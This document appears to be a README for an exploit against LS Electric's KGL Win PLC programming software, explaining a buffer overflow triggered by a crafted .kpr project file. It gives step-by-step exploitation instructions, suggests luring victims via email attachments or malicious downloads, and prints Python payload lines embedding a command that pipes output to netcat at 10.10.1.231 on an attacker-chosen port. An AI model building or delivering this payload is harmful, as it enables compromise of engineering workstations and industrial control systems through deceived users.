## KGL Win Software Buffer Overflow Vulnerability

The KGL Win software is a tool provided by LS Electric, a South Korean company that offers PLCs (Programmable Logic Controllers) and other electrical equipment. KGL Win allows you to generate project files for programming PLCs. However, there is a vulnerability in the software that can be exploited through a buffer overflow.

### Understanding the Vulnerability:

The buffer overflow vulnerability in KGL Win arises when the software attempts to load a specially crafted malicious file. This can lead to an overflow of data into adjacent memory space, allowing an attacker to execute malicious code.

The specific attack described here was discovered using fuzzing techniques, which involve sending a large volume of random or carefully constructed inputs to find vulnerabilities in a target application.

To exploit this vulnerability, an attacker would need to entice the user of the target machine to open the malicious file using KGL Win. This can be achieved by sending the file as an email attachment or distributing it through a malicious download, for example.

### Instructions for Exploiting the Vulnerability:

1. **Generating the Malicious Project File**: Create a project file named "Performance_Enchanced_test.kpr" with the ".kpr" file extension. This file will trigger the buffer overflow when opened with KGL Win.

2. **Adjusting Server IP and Port**: If the IP address or port of the server changes, you need to modify the malicious project file accordingly. In this case, we are using the IP address "10.10.1.231" and the port "9999".

3. **Modifying the IP Address and Port**:
   - Open the "new_code_exploit.py" script.
   - Locate the following lines:
     ```python
     cmd = b'\x41\x41\x41\x41'  # pad
     cmd += b'cmd /c echo create | nc 10.10.1.231 6666'
     cmd += b'\x20\x20\x20\x20'
     cmd += b'\x20\x20\x20\x20'
     cmd += b'\x20\x20\x20\x20'
     cmd += b'\x00\x42\x42\x42'  # pad, 60 bytes
     ```
   - Update the IP address and port in the `cmd` variable as follows:
     ```python
     cmd = b'\x41\x41\x41\x41'  # pad
     cmd += b'cmd /c echo create | nc 10.10.1.231 9999'
     cmd += b'\x20\x20\x20\x20'
     cmd += b'\x20\x20\x20\x20'
     cmd += b'\x20\x20\x20\x20'
     cmd += b'\x00\x42\x42\x42'  # pad, 60 bytes
     ```
   - No additional padding is required because the `cmd` variable had the same length in both cases.

Once you have followed these instructions, the malicious project file can be used to exploit the buffer overflow vulnerability in KGL Win.
